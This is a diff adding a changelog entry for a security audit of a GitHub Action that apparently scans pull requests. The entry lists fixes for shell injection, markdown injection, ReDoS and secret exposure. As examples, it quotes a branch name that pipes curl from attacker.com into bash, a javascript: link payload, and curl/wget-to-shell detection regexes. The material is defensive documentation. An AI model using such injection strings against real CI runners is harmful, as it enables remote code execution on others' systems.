@@ -2,6 +2,63 @@
 
 Reverse-chronological. Most recent entry first.
 
+## 2026-05-04 — Security Hardening (Marketplace Readiness Audit)
+
+Full security audit of `action.yml`, `analyze.py`, `post_check_run.py`, and `structural_parser.py` against the threat model of an adversarial consumer repo and a misconfigured credential set. 14 findings identified and fixed in a single commit (`bd90052`). Test suite maintained at 166 pass / 7 skip throughout.
+
+### CRITICAL fixes
+
+**C1 — Shell injection (`action.yml`)**
+`${{ github.head_ref }}` and `${{ github.base_ref }}` were interpolated directly into `run:` shell scripts. A branch named `$(curl attacker.com | bash)` would execute in the runner. Fixed by moving both values to `env:` declarations (`HEAD_REF`, `BASE_REF`) and referencing shell variables only. `git fetch origin "$BASE_REF:$BASE_REF"` also fixed.
+
+**C2 — PEM validation (`post_check_run.py`)**
+`if "-----BEGIN" not in key` accepted any string containing that substring, including truncated or corrupted keys. Replaced with a proper regex requiring a full BEGIN header, base64 body, and matching END footer.
+
+**C3 — Markdown injection (`analyze.py`)**
+`deleted_components` items from structural drift analysis were written directly to the GitHub PR comment body without escaping. A deleted function named `` `](javascript:alert(1)) `` would inject raw markdown. `_md_escape()` was already present in `format_markdown_report()` but not applied to component names or branch/target names. Applied to both.
+
+### HIGH fixes
+
+**H1 — URL injection (`post_check_run.py`)**
+`GITHUB_REPOSITORY` and `PAYLOADGUARD_INSTALLATION_ID` were inserted into GitHub API URL paths without format validation. Added `re.fullmatch()` guards: `owner/repo` format for the repository, digits-only for the installation ID.
+
+**H2 — Unbounded blob reads (`analyze.py`)**
+`data_stream.read()` was called with no size argument in the structural drift loop (two calls) and in the added-file content scan. A PR adding or modifying a large file would OOM the runner. Added `_MAX_BLOB_BYTES = 1_048_576` constant; all three reads now cap at 1 MB.
+
+**H3 — Private key exposure (`action.yml`)**
+The `private-key` input was never masked. Added a "Mask secrets" step — the first `run:` step in the action — that calls `echo "::add-mask::$PAYLOADGUARD_PRIVATE_KEY"` before any Python runs.
+
+**H4 — `repo_path` not normalised (`analyze.py`)**
+`args.repo_path` was passed directly to `git.Repo()` without normalisation. Applied `os.path.realpath(os.path.abspath(repo_path))` at the CLI entry point.
+
+### MEDIUM fixes
+
+**M1 — ReDoS (`analyze.py`)**
+`curl\b[^\n]*\|\s*(ba)?sh` and `wget\b[^\n]*\|\s*(ba)?sh` use unbounded `[^\n]*` before the pipe character. A line with many `|` characters triggers catastrophic backtracking. Rewritten as `.{0,200}` to bound the match window.
+
+**M2 — Recursion guard (`structural_parser.py`)**
+`ast.parse()` has no guard against deeply nested source code. `RecursionError` and `MemoryError` now caught and return an empty set rather than crashing the analysis.
+
+**M3 — YAML schema validation (`analyze.py`)**
+`load_config()` performed deep-merge but did not validate that merged values are the correct types. A string in a threshold list caused an opaque `TypeError` inside scoring. Added `isinstance` checks for all threshold keys; invalid values log a WARNING and fall back to defaults.
+
+**M4 — Exception log sanitisation (`post_check_run.py`)**
+The `__main__` exception handler printed `str(e)` unmodified. JWT library exceptions can embed PEM fragments. Messages containing `BEGIN`, `PRIVATE`, `KEY`, or `-----` are now redacted before printing to stderr.
+
+### Marketplace compliance
+
+Added `SECURITY.md` — required for GitHub Marketplace listing. Documents supported versions, vulnerability reporting path (GitHub Security Advisories), 5-day response SLA, and scope.
+
+### Commits (analyser)
+- `bd90052` — security: harden action, analyzer, and check-run poster for marketplace
+
+### Documents updated
+- `AUDIT_LOG.md` — new findings register for 2026-05-04 security audit run (14 findings, all fixed)
+- `DEVLOG.md` — this entry
+- `WHITEPAPER.md` — full rewrite to v1.2.0; security model section added; all layer descriptions updated
+
+---
+
 ## 2026-05-04 — Org Migration, Harness Hardening, INC-1/INC-3/INC-4 Closed
 
 ### Org migration: darkvader-plg → payloadguard-plg
